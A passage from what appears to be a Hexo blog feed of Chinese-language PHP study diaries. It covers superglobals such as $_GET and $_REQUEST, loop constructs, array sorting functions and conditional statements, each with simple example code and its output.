class="attr">name</span>=<span class="string">"fname"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php">$name = $_REQUEST[<span class="string">'fname'</span>]; </span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $name; </span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br><img src="/img/PHP/7-7日记.png" alt="avatar"></p><p>上面这个例子就是向前端显示了一个输入字段Input和一个提交按钮submit的表单。当用户点击submit提交表单时，将会执行表单中action的属性指定的脚本文件，用POST方式来接受输入的内容</p><p>使用超全局变量$_POST可以收集表单中input字段的数据</p><h2 id="GET"><a href="#GET" class="headerlink" title="$_GET"></a>$_GET</h2><p>$_GET同样被广泛用于收集表单数据中，只需要将表单中的method改为get即可</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"test_get.php?subject=PHP&amp;web=runoob.com"</span>&gt;</span>测试 $_GET<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>运行结果<br><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Study</span> PHP @ runoob.com</span><br></pre></td></tr></table></figure><br>当用户点击链接时便会输出运行结果</p><p>PHP脚本的意思是，将参数subject和web发送至test_get.php中，就可以在test_get.php文件中使用$_GET变量来获取这些数据<br>test_get.php的代码<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"Study "</span> . $_GET[<span class="string">'subject'</span>] . <span class="string">" @ "</span> . $_GET[<span class="string">'web'</span>];</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p><h1 id="PHP循环"><a href="#PHP循环" class="headerlink" title="PHP循环"></a>PHP循环</h1><p>代码编写必不可少的除了判断，还有循环</p><p>PHP的循环基本类似于C语言</p><ul><li>while 只要条件成立，则循环代码块</li><li>do…while 不管条件是否成立，都执行一次代码块，再进行条件判断</li><li>for 循环代码块指定的次数</li><li>foreach 根据数组中每个元素来循环代码块</li></ul><h2 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h2><p>语法<br><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(条件)&#123;</span><br><span class="line">代码块;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>例如循环输出1-5<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$i=<span class="number">1</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">while</span>($i&lt;=<span class="number">5</span>)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"The number is "</span> . $i . <span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php">    $i++;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">The number <span class="keyword">is</span> <span class="number">1</span></span><br><span class="line">The number <span class="keyword">is</span> <span class="number">2</span></span><br><span class="line">The number <span class="keyword">is</span> <span class="number">3</span></span><br><span class="line">The number <span class="keyword">is</span> <span class="number">4</span></span><br><span class="line">The number <span class="keyword">is</span> <span class="number">5</span></span><br></pre></td></tr></table></figure></p><h2 id="do…while语句"><a href="#do…while语句" class="headerlink" title="do…while语句"></a>do…while语句</h2><p>语法<br><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">    代码块;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (条件);</span><br></pre></td></tr></table></figure><br>还是类似的例子<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$i=<span class="number">1</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">do</span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    $i++;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"The number is "</span> . $i . <span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">while</span> ($i&lt;=<span class="number">5</span>);</span></span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">The number <span class="keyword">is</span> <span class="number">2</span></span><br><span class="line">The number <span class="keyword">is</span> <span class="number">3</span></span><br><span class="line">The number <span class="keyword">is</span> <span class="number">4</span></span><br><span class="line">The number <span class="keyword">is</span> <span class="number">5</span></span><br><span class="line">The number <span class="keyword">is</span> <span class="number">6</span></span><br></pre></td></tr></table></figure><br>这个例子中将i++与echo调换了顺序来说明do…while循环</p><h2 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h2><p>语法<br><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for (初始值<span class="comment">; 条件; 增量)</span></span><br><span class="line">&#123;</span><br><span class="line">    代码块<span class="comment">;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>与C语言一摸一样<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">for</span> ($i=<span class="number">1</span>; $i&lt;=<span class="number">5</span>; $i++)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"The number is "</span> . $i . <span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">The number <span class="keyword">is</span> <span class="number">1</span></span><br><span class="line">The number <span class="keyword">is</span> <span class="number">2</span></span><br><span class="line">The number <span class="keyword">is</span> <span class="number">3</span></span><br><span class="line">The number <span class="keyword">is</span> <span class="number">4</span></span><br><span class="line">The number <span class="keyword">is</span> <span class="number">5</span></span><br></pre></td></tr></table></figure></p><h2 id="foreach循环"><a href="#foreach循环" class="headerlink" title="foreach循环"></a>foreach循环</h2><p>语法<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> ($array <span class="keyword">as</span> $value)</span><br><span class="line">&#123;</span><br><span class="line">    代码块;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>每进行一次循环，当前数组元素的值就会被赋值给 $value 变量（数组指针会逐一地移动），在进行下一次循环时，您将看到数组中的下一个值</p><p>例如<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$x=<span class="keyword">array</span>(<span class="string">"one"</span>,<span class="string">"two"</span>,<span class="string">"three"</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">foreach</span> ($x <span class="keyword">as</span> $value)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> $value . <span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">one</span></span><br><span class="line"><span class="literal">two</span></span><br><span class="line"><span class="literal">three</span></span><br></pre></td></tr></table></figure></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>1.$GLOBALS是PHP最常见和常用的超全局变量，我的理解可以将其理解为JAVA中的object类，虽然方法和概念有所不同，但是思路基本一致，都是覆盖了整个编程范围</p><p>2.$_SERVER中的项目是由Web服务器创建的，不是所有服务器都包含了全部的项目，是根据服务器进行灵活变动的</p><p>3.$_REQUEST主要是用于收集HTML表单提交的内容，默认是post方式</p><p>4.$_POST同样应用于收集表单数据，$_GET也一样，只不过两者方式不同，一种是以POST方式接受数据，一种则是以GET的方式来接受数据</p><p>5.在编写循环语句时，要注意终止条件是否满足要求，避免出现死循环的现象</p><p>6.在事先已经确定好要循环多少次时，使用for循环最佳，不确定时使用while循环配合continue和break来终止循环，foreach循环常用在遍历输出数组上</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;超全局变量&quot;&gt;&lt;a href=&quot;#超全局变量&quot; class=&quot;headerlink&quot; title=&quot;超全局变量&quot;&gt;&lt;/a&gt;超全局变量&lt;/h1&gt;&lt;p&gt;PHP4.1.X后就启用了超全局变量，可以在脚本的任意位置运行&lt;/p&gt;
&lt;p&gt;PHP的超全局变量有:&lt;/p&gt;
&lt;ul
      
    
    </summary>
    
    
      <category term="日常学习" scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="PHP" scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/PHP/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>PHP-2020/7/6-学习日记</title>
    <link href="http://yoursite.com/2020/07/06/PHP-2020-7-6-%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/"/>
    <id>http://yoursite.com/2020/07/06/PHP-2020-7-6-%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/</id>
    <published>2020-07-06T12:15:41.000Z</published>
    <updated>2020-07-06T12:32:21.838Z</updated>
    
    <content type="html"><![CDATA[<h1 id="数组排序"><a href="#数组排序" class="headerlink" title="数组排序"></a>数组排序</h1><p>PHP中内置了PHP数组的排列函数</p><ul><li>sort() 对数组进行升序排列</li><li>rsort() 对数组进行降序排列</li><li>asort() 根据关联数组的值，对数组进行升序排列</li><li>ksort() 根据关联数组的键，对数组进行升序排列</li><li>arsort() 根据关联数组的值，对数组进行降序排列</li><li>krsort() 根据关联数组的键，对数组进行降序排列</li></ul><h2 id="sort"><a href="#sort" class="headerlink" title="sort()"></a>sort()</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$cars=<span class="keyword">array</span>(<span class="string">"Volvo"</span>,<span class="string">"BMW"</span>,<span class="string">"Toyota"</span>);</span></span><br><span class="line"><span class="php">sort($cars);</span></span><br><span class="line"><span class="php">print_r($cars);</span></span><br></pre></td></tr></table></figure><p>运行结果为<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; BMW</span><br><span class="line">    [<span class="number">1</span>] =&gt; Toyota</span><br><span class="line">    [<span class="number">2</span>] =&gt; Volvo</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p><p>数字也同样类似<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$numbers=<span class="built_in">array</span>(<span class="number">4</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">22</span>,<span class="number">11</span>);</span><br><span class="line">sort($numbers);</span><br><span class="line">print_r($numbers);</span><br></pre></td></tr></table></figure><br>运行结果为<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; <span class="number">2</span></span><br><span class="line">    [<span class="number">1</span>] =&gt; <span class="number">4</span></span><br><span class="line">    [<span class="number">2</span>] =&gt; <span class="number">6</span></span><br><span class="line">    [<span class="number">3</span>] =&gt; <span class="number">11</span></span><br><span class="line">    [<span class="number">4</span>] =&gt; <span class="number">22</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure></p><h2 id="rsort"><a href="#rsort" class="headerlink" title="rsort()"></a>rsort()</h2><p>rsort就与sort()相反，降序排列，r的意思就是reverse，不过多举例</p><h2 id="asort"><a href="#asort" class="headerlink" title="asort()"></a>asort()</h2><p>a就是associative，关联的意思，默认关联值<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$age=<span class="keyword">array</span>(<span class="string">"Peter"</span>=&gt;<span class="string">"35"</span>,<span class="string">"Ben"</span>=&gt;<span class="string">"37"</span>,<span class="string">"Joe"</span>=&gt;<span class="string">"43"</span>);</span></span><br><span class="line"><span class="php">asort($age);</span></span><br><span class="line"><span class="php">print_r($age);</span></span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [Peter] =&gt; <span class="number">35</span></span><br><span class="line">    [Ben] =&gt; <span class="number">37</span></span><br><span class="line">    [Joe] =&gt; <span class="number">43</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure></p><h2 id="arsort"><a href="#arsort" class="headerlink" title="arsort()"></a>arsort()</h2><p>与asort()相反<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$age=<span class="keyword">array</span>(<span class="string">"Peter"</span>=&gt;<span class="string">"35"</span>,<span class="string">"Ben"</span>=&gt;<span class="string">"37"</span>,<span class="string">"Joe"</span>=&gt;<span class="string">"43"</span>);</span></span><br><span class="line"><span class="php">arsort($age);</span></span><br><span class="line"><span class="php">print_r($age);</span></span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [Joe] =&gt; <span class="number">43</span></span><br><span class="line">    [Ben] =&gt; <span class="number">37</span></span><br><span class="line">    [Peter] =&gt; <span class="number">35</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure></p><h2 id="ksort"><a href="#ksort" class="headerlink" title="ksort()"></a>ksort()</h2><p>k其实就是key，就是键值对里的键<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$age=<span class="keyword">array</span>(<span class="string">"Peter"</span>=&gt;<span class="string">"35"</span>,<span class="string">"Ben"</span>=&gt;<span class="string">"37"</span>,<span class="string">"Joe"</span>=&gt;<span class="string">"43"</span>);</span></span><br><span class="line"><span class="php">ksort($age);</span></span><br><span class="line"><span class="php">print_r($age);</span></span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [Ben] =&gt; <span class="number">37</span></span><br><span class="line">    [Joe] =&gt; <span class="number">43</span></span><br><span class="line">    [Peter] =&gt; <span class="number">35</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><br>这次比较的其实就是键，也就是=&gt;前的内容</p><p>按字母大小顺序排列</p><h2 id="krsort"><a href="#krsort" class="headerlink" title="krsort()"></a>krsort()</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$age=<span class="keyword">array</span>(<span class="string">"Peter"</span>=&gt;<span class="string">"35"</span>,<span class="string">"Ben"</span>=&gt;<span class="string">"37"</span>,<span class="string">"Joe"</span>=&gt;<span class="string">"43"</span>);</span></span><br><span class="line"><span class="php">krsort($age);</span></span><br><span class="line"><span class="php">print_r($age);</span></span><br></pre></td></tr></table></figure><p>运行结果<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [Peter] =&gt; <span class="number">35</span></span><br><span class="line">    [Joe] =&gt; <span class="number">43</span></span><br><span class="line">    [Ben] =&gt; <span class="number">37</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><br>参考前面，不过多介绍</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>1.PHP内置的数组排列函数适用于所有合法的数组</p><p>2.r就是reversere,相反的意思，看到PHP函数中开头有r，基本可以确定是以原函数相反的返回结果</p><p>3.键值对是常见的存储方式，格式是KEY=&gt;DATA,不能颠倒，KEY与DATA的命名只要符合命名规则，可以随意命名</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;数组排序&quot;&gt;&lt;a href=&quot;#数组排序&quot; class=&quot;headerlink&quot; title=&quot;数组排序&quot;&gt;&lt;/a&gt;数组排序&lt;/h1&gt;&lt;p&gt;PHP中内置了PHP数组的排列函数&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;sort() 对数组进行升序排列&lt;/li&gt;
&lt;li&gt;rsort
      
    
    </summary>
    
    
      <category term="日常学习" scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="PHP" scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/PHP/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>PHP-2020/6/14-周报2</title>
    <link href="http://yoursite.com/2020/06/14/PHP-2020-6-14-%E5%91%A8%E6%8A%A52/"/>
    <id>http://yoursite.com/2020/06/14/PHP-2020-6-14-%E5%91%A8%E6%8A%A52/</id>
    <published>2020-06-14T02:22:55.000Z</published>
    <updated>2020-06-14T03:17:34.980Z</updated>
    
    <content type="html"><![CDATA[<h1 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h1><p>在编写代码的时候常常需要为不同判断执行不同的动作<br><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>语句 -条件成立时执行代码</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">if</span></span>...<span class="keyword">else</span>语句 -条件成立时执行一块代码，条件不成立时执行另一块代码</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">if</span></span>...elseif...<span class="keyword">else</span>语句 -在若干条件之一成立时执行一个代码块</span><br><span class="line"></span><br><span class="line">switch语句 -在若干条件之一成立时执行一个代码块</span><br></pre></td></tr></table></figure></p><h2 id="if语句"><a href="#if语句" class="headerlink" title="if语句"></a>if语句</h2><p>语法和C语言类似<br><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(条件)&#123;</span><br><span class="line">代码<span class="comment">;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>例如<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$t=date(<span class="string">"H"</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($t&lt;<span class="string">"20"</span>)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"Have a good day!"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><br>如果当前时间小于20，那就输出Have a good day!</p><h2 id="if…else语句"><a href="#if…else语句" class="headerlink" title="if…else语句"></a>if…else语句</h2><p>语法<br><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if (条件)</span><br><span class="line">&#123;</span><br><span class="line">条件成立时执行的代码<span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">条件不成立时执行的代码<span class="comment">;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>例如<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$t=date(<span class="string">"H"</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($t&lt;<span class="string">"20"</span>)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"Have a good day!"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"Have a good night!"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><br>如果当前时间小于20,就输出Have a good day!，否则就输出Have a good night!</p><h2 id="if…elseif…else"><a href="#if…elseif…else" class="headerlink" title="if…elseif…else"></a>if…elseif…else</h2><p>在若干条件之一成立时执行一个代码块</p><p>语法<br><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (条件)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> 条件成立时执行的代码;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (条件)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">elseif</span> 条件成立时执行的代码;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    条件不成立时执行的代码;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>例如<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$t=date(<span class="string">"H"</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($t&lt;<span class="string">"10"</span>)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"Have a good morning!"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">elseif</span> ($t&lt;<span class="string">"20"</span>)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"Have a good day!"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"Have a good night!"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><br>如果当前时间小于 10，下面的实例将输出 Have a good morning!，如果当前时间不小于 10 且小于 20，则输出 Have a good day!，否则输出 Have a good night!</p><h2 id="switch语句"><a href="#switch语句" class="headerlink" title="switch语句"></a>switch语句</h2><p>switch语句可以说是if…elseif…else的改进，目的是为了更方便的在多条件下执行正确的代码块</p><p>语法<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">switch</span> (n)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">case</span> label1:</span></span><br><span class="line"><span class="php">    如果 n=label1，此处代码将执行;</span></span><br><span class="line"><span class="php">    <span class="keyword">break</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">case</span> label2:</span></span><br><span class="line"><span class="php">    如果 n=label2，此处代码将执行;</span></span><br><span class="line"><span class="php">    <span class="keyword">break</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">default</span>:</span></span><br><span class="line"><span 